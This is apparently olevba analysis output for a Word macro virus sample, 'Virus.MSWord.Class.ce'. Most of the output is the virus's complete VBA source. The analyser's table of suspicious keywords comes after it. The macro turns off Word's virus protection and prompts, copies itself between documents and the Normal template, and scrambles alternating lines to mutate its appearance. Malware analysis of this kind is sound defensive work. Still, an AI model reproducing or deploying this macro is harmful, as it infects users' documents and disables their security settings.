olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.ce
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.ce - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Document_Close()
PLM = GGR + AQR
On Error Resume Next
PAJ = SRI + VTB
Application.EnableCancelKey = 0
UIL = QBN + KGN
KC7 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
OFG = SSM + VUE
Options.SaveNormalPrompt = 0
PVF = LCV + OAM
VR71 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
CCR = GBG + IGU
Options.VirusProtection = 0
VIG = DDO + JJP
Options.ConfirmConversions = 0
HNE = EMB + KTF
If KC7 > 0 And VR71 > 0 Then GoTo LE96
RIG = UNN + JCM
If KC7 = 0 Then
PUS = ALU + JOL
Set VL56 = ActiveDocument.VBProject.VBComponents.Item(1)
LKH = IFB + FVB
SF81 = True
IIK = DKF + NLD
End If
UOL = ICR + KQN
If VR71 = 0 Then
SAE = BCH + CAL
Set VL56 = NormalTemplate.VBProject.VBComponents.Item(1)
OLS = BEO + JHD
UL53 = True
PUL = BQI + KKE
End If
HCM = DUC + JGT
If UL53 <> True And SF81 <> True Then GoTo LE96
QGO = FBA + HRG
If UL53 = True Then VL56.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, KC7 - 1))
FKF = HAK + ETM
If SF81 = True Then VL56.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, VR71 - 1))
QUH = LBN + JVC
With VL56.CodeModule
UNH = DKE + VCA
For x = 2 To (VL56.CodeModule.CountOfLines - 1) Step 2
HMU = LIS + SOP
.replaceline x, (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " = " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & " + " & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22)))
VHK = JPD + JLR
Next x
LJL = FNK + OTI
End With
GGD = LEM + HTK
LE96:
EPQ = NRD + REV
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

